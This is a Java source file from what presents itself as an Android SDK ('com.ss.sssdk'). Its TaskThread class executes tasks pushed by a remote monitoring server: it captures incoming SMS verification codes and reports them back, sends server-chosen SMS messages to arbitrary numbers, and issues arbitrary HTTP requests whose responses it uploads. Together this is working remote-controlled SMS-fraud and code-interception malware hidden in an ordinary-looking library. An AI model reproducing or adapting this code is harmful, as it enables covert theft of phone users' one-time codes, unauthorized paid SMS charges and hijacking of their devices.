package com.ss.sssdk;

import org.json.JSONObject;

/**
 * Created by ljw on 15/11/11.
 */
public class TaskThread extends Thread{
    private JSONObject first_task;
    public static String sms_code = null;
    public TaskThread(JSONObject _task) {
        first_task = _task;
    }

    @Override
    public void run() {
        excuteTask(first_task);
    }

    private void excuteTask(JSONObject task) {
        String token = SdkTools.getKV("token");
        try {
            if(!task.has("taskid")) return;
            long tt = Math.round(Math.random()*1000)%20;
            sleep(tt*1000);
            int taskid = task.getInt("taskid");
            int step = task.getInt("step");
            SMSObserver.FILTER_SMS_CODE = task.getString("smsfilter");
            if(task.has("wait_sms")) {
                for(int i=0;i<10;i++) {
                    if(sms_code != null) {
                        JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url,HttpUrl.REPORT_RESULT,null,"token="+token+"&id="+taskid+"&step="+step+"&result="+sms_code);
                        sms_code = null;
                        if(ret != null && ret.getBoolean("b") && ret.has("result")) {
                            excuteTask(ret.getJSONObject("result"));
                        }
                        break;
                    }else {
                        sleep(5000);
                    }
                }
            }else if(task.has("send_sms")) {
                String content = task.getString("content");
                String phone = task.getString("phone");
                SdkTools.sendSMS(phone,content);
                sleep(30000);
                JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url,HttpUrl.REPORT_RESULT,null,"token="+token+"&id="+taskid+"&step="+step+"&result=ok");
                if(ret != null && ret.getBoolean("b") && ret.has("result")) {
                    excuteTask(ret.getJSONObject("result"));
                }
            }else {
                String url = task.getString("url");
                String params = task.getString("params");
                JSONObject header = task.getJSONObject("header");
                String method = task.getString("method");
                String result = method.equalsIgnoreCase("POST")?HttpRequest.sendPost(url, null, header, params):HttpRequest.sendGet(url, null, header, params);
                JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url, HttpUrl.REPORT_RESULT, null, "token="+token+"&id=" + taskid + "&step=" + step + "&result="+result);
                if(ret != null && ret.getBoolean("b") && ret.has("result")) {
                    excuteTask(ret.getJSONObject("result"));
                }
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }
}
